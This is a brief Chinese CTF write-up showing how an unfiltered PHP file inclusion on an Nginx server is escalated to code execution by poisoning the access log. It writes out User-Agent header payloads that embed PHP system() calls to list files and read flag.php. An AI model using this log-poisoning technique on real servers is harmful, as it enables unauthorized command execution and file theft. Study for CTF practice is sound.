### Nginx 日志 RCE

话不多说，直接上题（青少年 CTF 练习平台）

![](https://pic1.imgdb.cn/item/68393d1c58cb8da5c81c5769.png)

打开网页给出了源码

![](https://pic1.imgdb.cn/item/68393d3d58cb8da5c81c587a.png)

文件包含是没有任何过滤的，但是没有 `/flag` 文件

![](https://pic1.imgdb.cn/item/68393d5558cb8da5c81c5980.png)

分析架构为 Nginx 服务器

![](https://pic1.imgdb.cn/item/68393dd058cb8da5c81c5d82.png)

尝试访问日志文件 `/var/log/nginx/error.log` 和 `/var/log/nginx/access.log`

![](https://pic1.imgdb.cn/item/68393ec158cb8da5c81c625b.png)

发现 `access.log` 被设置为了 UA 头

![](https://pic1.imgdb.cn/item/68393eda58cb8da5c81c62c7.png)

于是我们可以改 UA 头为 PHP 代码

```php+HTML
User-Agent: <?php echo system('ls');?>
```

![](https://pic1.imgdb.cn/item/6839434158cb8da5c81c7a54.png)

再查看 `flag.php`

```php+HTML
User-Agent: <?php system('cat flag.php');?>
```

![](https://pic1.imgdb.cn/item/6839447e58cb8da5c81c7fc8.png)